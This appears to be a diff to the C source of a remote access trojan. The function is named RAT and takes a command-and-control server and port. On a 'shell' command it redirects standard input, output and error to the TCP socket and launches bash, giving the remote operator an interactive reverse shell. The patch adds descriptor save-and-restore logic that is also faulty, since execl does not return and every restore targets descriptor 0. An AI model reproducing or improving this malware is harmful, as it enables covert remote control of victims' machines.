@@ -58,13 +58,26 @@ void RAT(char* C2_Server, int C2_Port)
                 // Should only be used in individual interactive environments == TBC
                 if ((strcmp(CommandReceived, "shell") == 0))
                 {
+                    // Save original FDs
+                    int orig_stdin  = dup(0);
+                    int orig_stdout  = dup(1);
+                    int orig_stderr  = dup(2);
+
                     // Establish descriptor handling
                     dup2(tcp_sock,0); // STDIN
                     dup2(tcp_sock,1); // STDOUT
                     dup2(tcp_sock,2); // STDERR
 
                     // execute bin/bash << 0,1,2
-                    execl("/bin/bash","sh","-i",NULL,NULL);
+                    execl("/bin/bash","bash",NULL,NULL);
+
+                    dup2(orig_stdin,0);
+                    dup2(orig_stdout,0);
+                    dup2(orig_stderr,0);
+
+                    close(orig_stdin);
+                    close(orig_stdout);
+                    close(orig_stderr);
 
 
                     memset(CommandReceived, 0, sizeof(CommandReceived));
